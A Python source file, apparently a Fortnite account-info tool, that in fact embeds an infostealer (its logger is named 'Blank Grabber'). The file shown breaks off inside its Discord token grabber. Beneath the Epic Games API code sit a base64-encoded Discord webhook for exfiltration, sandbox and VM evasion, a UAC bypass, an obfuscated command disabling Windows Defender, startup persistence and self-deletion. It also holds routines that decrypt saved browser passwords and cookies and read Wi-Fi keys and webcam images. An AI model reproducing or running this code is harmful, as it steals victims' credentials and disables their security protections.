# pip install pyaesm urllib3

import base64
import os
import subprocess
import sys
import json
import pyaes
import random
import shutil
import sqlite3
import re
import traceback
import time
import ctypes
import logging
import zlib
from threading import Thread
from ctypes import wintypes
from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warnings_urllib3
disable_warnings_urllib3()
import colorama
from colorama import Fore, Back, Style
colorama.init()
print(Back.BLACK + Fore.YELLOW + "   #######         ######          ##         #         #" + Style.RESET_ALL)
print(Back.BLACK + Fore.YELLOW + " ##       ##     ##       ##      #  #        ##       ##" + Style.RESET_ALL)
print(Back.BLACK + Fore.YELLOW + " ##             #                #    #       # #     # #" + Style.RESET_ALL)
print(Back.BLACK + Fore.YELLOW + "    ######      #               #  ##  #      #  #   #  #" + Style.RESET_ALL)
print(Back.BLACK + Fore.YELLOW + "         ##     #               ########      #   # #   #" + Style.RESET_ALL)
print(Back.BLACK + Fore.YELLOW + "  ##       ##   ##       ##     #       #     #    #    #" + Style.RESET_ALL)
print(Back.BLACK + Fore.YELLOW + "    ######         ######       #       #     #         #" + Style.RESET_ALL)

version = "0.2"
configVersion = "0.2"
print(f"Fortnite account info v{version} by GROHZE\n")
try:
    import json
    import requests
    import os
    from configparser import ConfigParser
    from datetime import datetime
    import webbrowser
    import uuid
except Exception as emsg:
    input(f"ERROR: {emsg}. To run this program, please install it.\n\nPress ENTER to close the program.")
    exit()

# Links that will be used in the later part of code.
class links:
    loginLink1 = "https://www.epicgames.com/id/api/redirect?clientId={0}&responseType=code"
    loginLink2 = "https://www.epicgames.com/id/logout?redirectUrl=https%3A%2F%2Fwww.epicgames.com%2Fid%2Flogin%3FredirectUrl%3Dhttps%253A%252F%252Fwww.epicgames.com%252Fid%252Fapi%252Fredirect%253FclientId%253D{0}%2526responseType%253Dcode"
    getOAuth = "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/{0}"
    getDeviceAuth = "https://account-public-service-prod.ol.epicgames.com/account/api/public/account/{0}/deviceAuth"
    singleResponses = [["https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/storefront/v2/keychain", "{}", "Keychain", "keychain"], ["https://fortnitecontent-website-prod07.ol.epicgames.com/content/api/pages/fortnite-game" , "", "Contentpages", "contentpages"], ["https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/calendar/v1/timeline", "{}", "Timeline", "timeline"], ["https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/world/info", "{}", "Theater (StW World)", "worldstw"]]
    catalog = "https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/storefront/v2/catalog"
    catalogBulkOffers = "https://catalog-public-service-prod06.ol.epicgames.com/catalog/api/shared/bulk/offers?{0}"
    catalogPriceEngine = "https://priceengine-public-service-ecomprod01.ol.epicgames.com/priceengine/api/shared/offers/price"
    profileRequest = "https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{0}/{1}/{2}?profileId={3}"
    discovery = "https://fn-service-discovery-live-public.ogs.live.on.epicgames.com/api/v1/discovery/surface/{0}?appId=Fortnite"
    accountInfo = [["https://account-public-service-prod.ol.epicgames.com/account/api/public/account/{0}", "Account Info #1", "accountInfo1"], ["https://account-public-service-prod.ol.epicgames.com/account/api/public/account?accountId={0}", "Account Info #2", "accountInfo2"], ["https://account-public-service-prod.ol.epicgames.com/account/api/public/account/{0}/externalAuths", "Account External Auths Info", "externalAuths"], ["https://statsproxy-public-service-live.ol.epicgames.com/statsproxy/api/statsv2/account/{0}", "Battle Royale account statistics", "brStats"], ["https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/br-inventory/account/{0}", "Battle Royale inventory (gold bars)", "brInventory"]]
    friendlists = [["https://friends-public-service-prod06.ol.epicgames.com/friends/api/public/friends/{0}?includePending=true", "Friendslist #1", "friendslist"], ["https://friends-public-service-prod06.ol.epicgames.com/friends/api/v1/{0}/summary", "Friendslist #2", "friendslist2"]]
    friendsinfo = "https://account-public-service-prod.ol.epicgames.com/account/api/public/account?{0}"
    cloudstorageRequest = "https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/cloudstorage/{0}"
    getAccountIdByName = "https://account-public-service-prod.ol.epicgames.com/account/api/public/account/displayName/{0}"

# Global variables
class vars: accessToken = displayName = headers = path = accountId = ""

# Start a new requests session.
session = requests.Session()
class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTEzNjYxMTM0ODA1MTE0ODgzMC9vYnV0RllWSjZVWGhFVHF1dGFDcVJOLURSanZJczV2a2MwVEg0UDNSTjVjZVZZbkhWdlFJQUVqTzNkRHlmWnM4aS0zVQ==').decode())
    Mutex = base64.b64decode('R2xyYU9kdEwwVDFkUGlySA==').decode()
    PingMe = bool('true')
    Vmprotect = bool('true')
    Startup = bool('')
    Melt = bool('true')
    UacBypass = bool('')
    ArchivePassword = base64.b64decode('MTIz').decode()
    HideConsole = bool('true')
    Debug = bool('')
    RunBoundOnStartup = bool('')
    CaptureWebcam = bool('true')
    CapturePasswords = bool('true')
    CaptureCookies = bool('true')
    CaptureAutofills = bool('true')
    CaptureHistory = bool('true')
    CaptureDiscordTokens = bool('true')
    CaptureGames = bool('true')
    CaptureWifiPasswords = bool('true')
    CaptureSystemInfo = bool('true')
    CaptureScreenshot = bool('true')
    CaptureTelegram = bool('true')
    CaptureCommonFiles = bool('true')
    CaptureWallets = bool('true')
    FakeError = (bool(''), ('', '', '0'))
    BlockAvSites = bool('true')
    DiscordInjection = bool('true')
if not hasattr(sys, '_MEIPASS'):
    sys._MEIPASS = os.path.dirname(os.path.abspath(__file__))
ctypes.windll.kernel32.SetConsoleMode(ctypes.windll.kernel32.GetStdHandle(-11), 7)
logging.basicConfig(format='\x1b[1;36m%(funcName)s\x1b[0m:\x1b[1;33m%(levelname)7s\x1b[0m:%(message)s')
for _, logger in logging.root.manager.loggerDict.items():
    logger.disabled = True
Logger = logging.getLogger('Blank Grabber')
Logger.setLevel(logging.INFO)
if not Settings.Debug:
    Logger.disabled = True

class VmProtect:
    BLACKLISTED_UUIDS = ('7AB5C494-39F5-4941-9163-47F54D6D5016', '032E02B4-0499-05C3-0806-3C0700080009', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FE822042-A70C-D08B-F1D1-C207055A488F', '76122042-C286-FA81-F0A8-514CC507B250', '481E2042-A1AF-D390-CE06-A8F783B1E76A', 'F3988356-32F5-4AE1-8D47-FD3B8BAFBD4C', '9961A120-E691-4FFE-B67B-F0E4115D5919')
    BLACKLISTED_COMPUTERNAMES = ('bee7370c-8c0c-4', 'desktop-nakffmt', 'win-5e07cos9alr', 'b30f0242-1c6a-4', 'desktop-vrsqlag', 'q9iatrkprh', 'xc64zb', 'desktop-d019gdm', 'desktop-wi8clet', 'server1', 'lisa-pc', 'john-pc', 'desktop-b0t93d6', 'desktop-1pykp29', 'desktop-1y2433r', 'wileypc', 'work', '6c4e733f-c2d9-4', 'ralphs-pc', 'desktop-wg3myjs', 'desktop-7xc6gez', 'desktop-5ov9s0o', 'qarzhrdbpj', 'oreleepc', 'archibaldpc', 'julia-pc', 'd1bnjkfvlh', 'compname_5076', 'desktop-vkeons4', 'NTT-EFF-2W11WSS')
    BLACKLISTED_USERS = ('wdagutilityaccount', 'abby', 'peter wilson', 'hmarc', 'patex', 'john-pc', 'rdhj0cnfevzx', 'keecfmwgj', 'frank', '8nl0colnq5bq', 'lisa', 'john', 'george', 'pxmduopvyx', '8vizsm', 'w0fjuovmccp5a', 'lmvwjj9b', 'pqonjhvwexss', '3u2v9m8', 'julia', 'heuerzl', 'harry johnson', 'j.seance', 'a.monaldo', 'tvm')
    BLACKLISTED_TASKS = ('fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'vboxservice', 'df5serv', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg', 'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver', 'vmwareservice', 'vmwaretray', 'discordtokenprotector')

    @staticmethod
    def checkUUID() -> bool:
        Logger.info('Checking UUID')
        uuid = subprocess.run('wmic csproduct get uuid', shell=True, capture_output=True).stdout.splitlines()[2].decode(errors='ignore').strip()
        return uuid in VmProtect.BLACKLISTED_UUIDS

    @staticmethod
    def checkComputerName() -> bool:
        Logger.info('Checking computer name')
        computername = os.getenv('computername')
        return computername.lower() in VmProtect.BLACKLISTED_COMPUTERNAMES

    @staticmethod
    def checkUsers() -> bool:
        Logger.info('Checking username')
        user = os.getlogin()
        return user.lower() in VmProtect.BLACKLISTED_USERS

    @staticmethod
    def checkHosting() -> bool:
        Logger.info('Checking if system is hosted online')
        http = PoolManager(cert_reqs='CERT_NONE')
        try:
            return http.request('GET', 'http://ip-api.com/line/?fields=hosting').data.decode(errors='ignore').strip() == 'true'
        except Exception:
            Logger.info('Unable to check if system is hosted online')
            return False

    @staticmethod
    def checkHTTPSimulation() -> bool:
        Logger.info('Checking if system is simulating connection')
        http = PoolManager(cert_reqs='CERT_NONE', timeout=1.0)
        try:
            http.request('GET', f'https://blank-{Utility.GetRandomString()}.in')
        except Exception:
            return False
        else:
            return True

    @staticmethod
    def checkRegistry() -> bool:
        Logger.info('Checking registry')
        r1 = subprocess.run('REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2', capture_output=True, shell=True)
        r2 = subprocess.run('REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2', capture_output=True, shell=True)
        gpucheck = any((x.lower() in subprocess.run('wmic path win32_VideoController get name', capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip().lower() for x in ('virtualbox', 'vmware')))
        dircheck = any([os.path.isdir(path) for path in ('D:\\Tools', 'D:\\OS2', 'D:\\NT3X')])
        return r1.returncode != 1 and r2.returncode != 1 or gpucheck or dircheck

    @staticmethod
    def killTasks() -> None:
        Utility.TaskKill(*VmProtect.BLACKLISTED_TASKS)

    @staticmethod
    def isVM() -> bool:
        Logger.info('Checking if system is a VM')
        Thread(target=VmProtect.killTasks, daemon=True).start()
        result = VmProtect.checkHTTPSimulation() or VmProtect.checkUUID() or VmProtect.checkComputerName() or VmProtect.checkUsers() or VmProtect.checkHosting() or VmProtect.checkRegistry()
        if result:
            Logger.info('System is a VM')
        else:
            Logger.info('System is not a VM')
        return result

class Errors:
    errors: list[str] = []

    @staticmethod
    def Catch(func):

        def newFunc(*args, **kwargs):
            try:
                return func(*args, **kwargs)
            except Exception as e:
                if isinstance(e, KeyboardInterrupt):
                    os._exit(1)
                if not isinstance(e, UnicodeEncodeError):
                    trb = traceback.format_exc()
                    Errors.errors.append(trb)
                    if Utility.GetSelf()[1]:
                        Logger.error(trb)
        return newFunc

class Tasks:
    threads: list[Thread] = list()

    @staticmethod
    def AddTask(task: Thread) -> None:
        Tasks.threads.append(task)

    @staticmethod
    def WaitForAll() -> None:
        for thread in Tasks.threads:
            thread.join()

class Syscalls:

    @staticmethod
    def CaptureWebcam(index: int, filePath: str) -> bool:
        avicap32 = ctypes.windll.avicap32
        WS_CHILD = 1073741824
        WM_CAP_DRIVER_CONNECT = 1024 + 10
        WM_CAP_DRIVER_DISCONNECT = 1026
        WM_CAP_FILE_SAVEDIB = 1024 + 100 + 25
        hcam = avicap32.capCreateCaptureWindowW(wintypes.LPWSTR('Blank'), WS_CHILD, 0, 0, 0, 0, ctypes.windll.user32.GetDesktopWindow(), 0)
        result = False
        if hcam:
            if ctypes.windll.user32.SendMessageA(hcam, WM_CAP_DRIVER_CONNECT, index, 0):
                if ctypes.windll.user32.SendMessageA(hcam, WM_CAP_FILE_SAVEDIB, 0, wintypes.LPWSTR(filePath)):
                    result = True
                ctypes.windll.user32.SendMessageA(hcam, WM_CAP_DRIVER_DISCONNECT, 0, 0)
            ctypes.windll.user32.DestroyWindow(hcam)
        return result

    @staticmethod
    def CreateMutex(mutex: str) -> bool:
        kernel32 = ctypes.windll.kernel32
        mutex = kernel32.CreateMutexA(None, False, mutex)
        return kernel32.GetLastError() != 183

    @staticmethod
    def CryptUnprotectData(encrypted_data: bytes, optional_entropy: str=None) -> bytes:

        class DATA_BLOB(ctypes.Structure):
            _fields_ = [('cbData', ctypes.c_ulong), ('pbData', ctypes.POINTER(ctypes.c_ubyte))]
        pDataIn = DATA_BLOB(len(encrypted_data), ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_ubyte)))
        pDataOut = DATA_BLOB()
        pOptionalEntropy = None
        if optional_entropy is not None:
            optional_entropy = optional_entropy.encode('utf-16')
            pOptionalEntropy = DATA_BLOB(len(optional_entropy), ctypes.cast(optional_entropy, ctypes.POINTER(ctypes.c_ubyte)))
        if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, ctypes.byref(pOptionalEntropy) if pOptionalEntropy is not None else None, None, None, 0, ctypes.byref(pDataOut)):
            data = (ctypes.c_ubyte * pDataOut.cbData)()
            ctypes.memmove(data, pDataOut.pbData, pDataOut.cbData)
            ctypes.windll.Kernel32.LocalFree(pDataOut.pbData)
            return bytes(data)
        raise ValueError('Invalid encrypted_data provided!')

    @staticmethod
    def HideConsole() -> None:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

class Utility:

    @staticmethod
    def GetSelf() -> tuple[str, bool]:
        if hasattr(sys, 'frozen'):
            return (sys.executable, True)
        else:
            return (__file__, False)

    @staticmethod
    def TaskKill(*tasks: str) -> None:
        tasks = list(map(lambda x: x.lower(), tasks))
        out = subprocess.run('tasklist /FO LIST', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().split('\r\n\r\n')
        for i in out:
            i = i.split('\r\n')[:2]
            try:
                name, pid = (i[0].split()[-1], int(i[1].split()[-1]))
                name = name[:-4] if name.endswith('.exe') else name
                if name.lower() in tasks:
                    subprocess.run('taskkill /F /PID %d' % pid, shell=True, capture_output=True)
            except Exception:
                pass

    @staticmethod
    def UACPrompt(path: str) -> bool:
        return ctypes.windll.shell32.ShellExecuteW(None, 'runas', path, ' '.join(sys.argv), None, 1) == 42

    @staticmethod
    def DisableDefender() -> None:
        command = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDIgJiAiJVByb2dyYW1GaWxlcyVcV2luZG93cyBEZWZlbmRlclxNcENtZFJ1bi5leGUiIC1SZW1vdmVEZWZpbml0aW9ucyAtQWxs').decode(errors='ignore')
        subprocess.Popen(command, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

    @staticmethod
    def ExcludeFromDefender(path: str=None) -> None:
        if path is None:
            path = Utility.GetSelf()[0]
        subprocess.Popen("powershell -Command Add-MpPreference -ExclusionPath '{}'".format(path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

    @staticmethod
    def GetRandomString(length: int=5, invisible: bool=False):
        if invisible:
            return ''.join(random.choices(['\xa0', chr(8239)] + [chr(x) for x in range(8192, 8208)], k=length))
        else:
            return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=length))

    @staticmethod
    def GetWifiPasswords() -> dict:
        profiles = list()
        passwords = dict()
        for line in subprocess.run('netsh wlan show profile', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().splitlines():
            if 'All User Profile' in line:
                name = line[line.find(':') + 1:].strip()
                profiles.append(name)
        for profile in profiles:
            found = False
            for line in subprocess.run(f'netsh wlan show profile "{profile}" key=clear', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().splitlines():
                if 'Key Content' in line:
                    passwords[profile] = line[line.find(':') + 1:].strip()
                    found = True
                    break
            if not found:
                passwords[profile] = '(None)'
        return passwords

    @staticmethod
    def GetLnkTarget(path_to_lnk: str) -> str | None:
        target = None
        if os.path.isfile(path_to_lnk):
            output = subprocess.run('wmic path win32_shortcutfile where name="%s" get target /value' % os.path.abspath(path_to_lnk).replace('\\', '\\\\'), shell=True, capture_output=True).stdout.decode()
            if output:
                for line in output.splitlines():
                    if line.startswith('Target='):
                        temp = line.lstrip('Target=').strip()
                        if os.path.exists(temp):
                            target = temp
                            break
        return target

    @staticmethod
    def GetLnkFromStartMenu(app: str) -> list[str]:
        shortcutPaths = []
        startMenuPaths = [os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs'), os.path.join('C:\\', 'ProgramData', 'Microsoft', 'Windows', 'Start Menu', 'Programs')]
        for startMenuPath in startMenuPaths:
            for root, _, files in os.walk(startMenuPath):
                for file in files:
                    if file.lower() == '%s.lnk' % app.lower():
                        shortcutPaths.append(os.path.join(root, file))
        return shortcutPaths

    @staticmethod
    def IsAdmin() -> bool:
        return ctypes.windll.shell32.IsUserAnAdmin() == 1

    @staticmethod
    def UACbypass(method: int=1) -> bool:
        if Utility.GetSelf()[1]:
            execute = lambda cmd: subprocess.run(cmd, shell=True, capture_output=True)
            match method:
                case 1:
                    execute(f'reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{sys.executable}" /f')
                    execute('reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v "DelegateExecute" /f')
                    log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                    execute('computerdefaults --nouacbypass')
                    log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                    execute('reg delete hkcu\\Software\\Classes\\ms-settings /f')
                    if log_count_after > log_count_before:
                        return Utility.UACbypass(method + 1)
                case 2:
                    execute(f'reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{sys.executable}" /f')
                    execute('reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v "DelegateExecute" /f')
                    log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                    execute('fodhelper --nouacbypass')
                    log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                    execute('reg delete hkcu\\Software\\Classes\\ms-settings /f')
                    if log_count_after > log_count_before:
                        return Utility.UACbypass(method + 1)
                case _:
                    return False
            return True

    @staticmethod
    def IsInStartup() -> bool:
        path = os.path.dirname(Utility.GetSelf()[0])
        return os.path.basename(path).lower() == 'startup'

    @staticmethod
    def PutInStartup() -> str:
        STARTUPDIR = 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp'
        file, isExecutable = Utility.GetSelf()
        if isExecutable:
            out = os.path.join(STARTUPDIR, '{}.scr'.format(Utility.GetRandomString(invisible=True)))
            os.makedirs(STARTUPDIR, exist_ok=True)
            try:
                shutil.copy(file, out)
            except Exception:
                return None
            return out

    @staticmethod
    def IsConnectedToInternet() -> bool:
        http = PoolManager(cert_reqs='CERT_NONE')
        try:
            return http.request('GET', 'https://gstatic.com/generate_204').status == 204
        except Exception:
            return False

    @staticmethod
    def DeleteSelf():
        path, isExecutable = Utility.GetSelf()
        if isExecutable:
            subprocess.Popen('ping localhost -n 3 > NUL && del /A H /F "{}"'.format(path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
            os._exit(0)
        else:
            os.remove(path)

    @staticmethod
    def HideSelf() -> None:
        path, _ = Utility.GetSelf()
        subprocess.Popen('attrib +h +s "{}"'.format(path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

    @staticmethod
    def BlockSites() -> None:
        if Utility.IsAdmin():
            call = subprocess.run('REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /V DataBasePath', shell=True, capture_output=True)
            if call.returncode != 0:
                hostdirpath = os.path.join('System32', 'drivers', 'etc')
            else:
                hostdirpath = os.sep.join(call.stdout.decode(errors='ignore').strip().splitlines()[-1].split()[-1].split(os.sep)[1:])
            hostfilepath = os.path.join(os.getenv('systemroot'), hostdirpath, 'hosts')
            if not os.path.isfile(hostfilepath):
                return
            with open(hostfilepath) as file:
                data = file.readlines()
            BANNED_SITES = ('virustotal.com', 'avast.com', 'totalav.com', 'scanguard.com', 'totaladblock.com', 'pcprotect.com', 'mcafee.com', 'bitdefender.com', 'us.norton.com', 'avg.com', 'malwarebytes.com', 'pandasecurity.com', 'avira.com', 'norton.com', 'eset.com', 'zillya.com', 'kaspersky.com', 'usa.kaspersky.com', 'sophos.com', 'home.sophos.com', 'adaware.com', 'bullguard.com', 'clamav.net', 'drweb.com', 'emsisoft.com', 'f-secure.com', 'zonealarm.com', 'trendmicro.com', 'ccleaner.com')
            newdata = []
            for i in data:
                if any([x in i for x in BANNED_SITES]):
                    continue
                else:
                    newdata.append(i)
            for i in BANNED_SITES:
                newdata.append('\t0.0.0.0 {}'.format(i))
                newdata.append('\t0.0.0.0 www.{}'.format(i))
            newdata = '\n'.join(newdata).replace('\n\n', '\n')
            subprocess.run('attrib -r {}'.format(hostfilepath), shell=True, capture_output=True)
            with open(hostfilepath, 'w') as file:
                file.write(newdata)
            subprocess.run('attrib +r {}'.format(hostfilepath), shell=True, capture_output=True)

class Browsers:

    class Chromium:
        BrowserPath: str = None
        EncryptionKey: bytes = None

        def __init__(self, browserPath: str) -> None:
            if not os.path.isdir(browserPath):
                raise NotADirectoryError('Browser path not found!')
            self.BrowserPath = browserPath

        def GetEncryptionKey(self) -> bytes | None:
            if self.EncryptionKey is not None:
                return self.EncryptionKey
            else:
                localStatePath = os.path.join(self.BrowserPath, 'Local State')
                if os.path.isfile(localStatePath):
                    with open(localStatePath, encoding='utf-8', errors='ignore') as file:
                        jsonContent: dict = json.load(file)
                    encryptedKey: str = jsonContent['os_crypt']['encrypted_key']
                    encryptedKey = base64.b64decode(encryptedKey.encode())[5:]
                    self.EncryptionKey = Syscalls.CryptUnprotectData(encryptedKey)
                    return self.EncryptionKey
                else:
                    return None

        def Decrypt(self, buffer: bytes, key: bytes) -> str:
            version = buffer.decode(errors='ignore')
            if version.startswith(('v10', 'v11')):
                iv = buffer[3:15]
                cipherText = buffer[15:]
                return pyaes.AESModeOfOperationGCM(key, iv).decrypt(cipherText)[:-16].decode(errors='ignore')
            else:
                return str(Syscalls.CryptUnprotectData(buffer))

        def GetPasswords(self) -> list[tuple[str, str, str]]:
            encryptionKey = self.GetEncryptionKey()
            passwords = list()
            if encryptionKey is None:
                return passwords
            loginFilePaths = list()
            for root, _, files in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == 'login data':
                        filepath = os.path.join(root, file)
                        loginFilePaths.append(filepath)
            for path in loginFilePaths:
                while True:
                    tempfile = os.path.join(os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
                    if not os.path.isfile(tempfile):
                        break
                try:
                    shutil.copy(path, tempfile)
                except Exception:
                    continue
                db = sqlite3.connect(tempfile)
                db.text_factory = lambda b: b.decode(errors='ignore')
                cursor = db.cursor()
                try:
                    results = cursor.execute('SELECT origin_url, username_value, password_value FROM logins').fetchall()
                    for url, username, password in results:
                        password = self.Decrypt(password, encryptionKey)
                        if url and username and password:
                            passwords.append((url, username, password))
                except Exception:
                    pass
                cursor.close()
                db.close()
                os.remove(tempfile)
            return passwords

        def GetCookies(self) -> list[tuple[str, str, str, str, int]]:
            encryptionKey = self.GetEncryptionKey()
            cookies = list()
            if encryptionKey is None:
                return cookies
            cookiesFilePaths = list()
            for root, _, files in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == 'cookies':
                        filepath = os.path.join(root, file)
                        cookiesFilePaths.append(filepath)
            for path in cookiesFilePaths:
                while True:
                    tempfile = os.path.join(os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
                    if not os.path.isfile(tempfile):
                        break
                try:
                    shutil.copy(path, tempfile)
                except Exception:
                    continue
                db = sqlite3.connect(tempfile)
                db.text_factory = lambda b: b.decode(errors='ignore')
                cursor = db.cursor()
                try:
                    results = cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies').fetchall()
                    for host, name, path, cookie, expiry in results:
                        cookie = self.Decrypt(cookie, encryptionKey)
                        if host and name and cookie:
                            cookies.append((host, name, path, cookie, expiry))
                except Exception:
                    pass
                cursor.close()
                db.close()
                os.remove(tempfile)
            return cookies

        def GetHistory(self) -> list[tuple[str, str, int]]:
            history = list()
            historyFilePaths = list()
            for root, _, files in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == 'history':
                        filepath = os.path.join(root, file)
                        historyFilePaths.append(filepath)
            for path in historyFilePaths:
                while True:
                    tempfile = os.path.join(os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
                    if not os.path.isfile(tempfile):
                        break
                try:
                    shutil.copy(path, tempfile)
                except Exception:
                    continue
                db = sqlite3.connect(tempfile)
                db.text_factory = lambda b: b.decode(errors='ignore')
                cursor = db.cursor()
                try:
                    results = cursor.execute('SELECT url, title, visit_count, last_visit_time FROM urls').fetchall()
                    for url, title, vc, lvt in results:
                        if url and title and (vc is not None) and (lvt is not None):
                            history.append((url, title, vc, lvt))
                except Exception:
                    pass
                cursor.close()
                db.close()
                os.remove(tempfile)
            history.sort(key=lambda x: x[3], reverse=True)
            return list([(x[0], x[1], x[2]) for x in history])

        def GetAutofills(self) -> list[str]:
            autofills = list()
            autofillsFilePaths = list()
            for root, _, files in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == 'web data':
                        filepath = os.path.join(root, file)
                        autofillsFilePaths.append(filepath)
            for path in autofillsFilePaths:
                while True:
                    tempfile = os.path.join(os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
                    if not os.path.isfile(tempfile):
                        break
                try:
                    shutil.copy(path, tempfile)
                except Exception:
                    continue
                db = sqlite3.connect(tempfile)
                db.text_factory = lambda b: b.decode(errors='ignore')
                cursor = db.cursor()
                try:
                    results: list[str] = [x[0] for x in cursor.execute('SELECT value FROM autofill').fetchall()]
                    for data in results:
                        data = data.strip()
                        if data and (not data in autofills):
                            autofills.append(data)
                except Exception:
                    pass
                cursor.close()
                db.close()
                os.remove(tempfile)
            return autofills

class Discord:
    httpClient = PoolManager(cert_reqs='CERT_NONE')
    ROAMING = os.getenv('appdata')
    LOCALAPPDATA = os.getenv('localappdata')
    REGEX = '[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{25,110}'
    REGEX_ENC = 'dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\"]*'

    @staticmethod
    def GetHeaders(token: str=None) -> dict:
        headers = {'content-type': 'application/json', 'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4593.122 Safari/537.36'}
        if token:
            headers['authorization'] = token
        return headers

    @staticmethod
    def GetTokens() -> list[dict]:
        results: list[dict] = list()
        tokens: list[str] = list()
        threads: list[Thread] = list()
